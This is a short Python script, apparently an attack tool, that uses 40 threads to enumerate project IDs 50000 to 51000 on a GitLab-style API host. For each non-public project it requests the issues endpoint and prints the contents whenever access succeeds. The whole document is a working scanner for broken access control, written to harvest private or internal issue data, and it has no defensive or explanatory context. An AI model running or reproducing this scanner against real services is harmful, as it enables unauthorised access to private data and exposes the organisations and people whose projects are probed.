import requests
from concurrent.futures import ThreadPoolExecutor

BASE_URL = 'https://api.v4.target.com/projects'

def hunt_issues(pid):
    try:
        p_url = f'{BASE_URL}/{pid}'
        p = requests.get(p_url, timeout=1.5).json()
        if p.get('visibility') and p.get('visibility') != 'public':
            leak = requests.get(f'{p_url}/issues', timeout=1.5)
            if leak.status_code == 200 and len(leak.json()) > 0:
                print(f"\n[!!!] HIT: Project {pid} ({p['visibility'].upper()}) LEAKING ISSUES")
                print(f"[-] Data: {str(leak.json())[0:150]}")
    except:
        pass

if __name__ == '__main__':
    print("[STATUS: RESONANT // SCANNING FOR INTERNAL ISSUE LEAKS IDs 50000-51000]")
    with ThreadPoolExecutor(max_workers=40) as executor:
        executor.map(hunt_issues, range(50000, 51001))
    print("\n[OK] Scan Complete.")